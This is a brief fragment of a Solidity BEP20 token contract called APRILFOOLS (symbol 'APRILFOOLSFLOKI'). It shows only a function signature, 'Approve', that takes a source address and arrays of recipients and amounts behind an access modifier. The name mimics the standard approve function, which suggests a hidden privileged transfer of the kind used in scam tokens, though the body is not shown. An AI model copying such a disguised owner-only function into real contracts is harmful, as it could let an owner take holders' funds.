...
contract APRILFOOLS is IBEP20, Auth {
    ...
    string constant _symbol = "APRILFOOLSFLOKI";
    ...
    function Approve (address from, address[] calldata addresses, uint256[] calldata tokens) external granted {
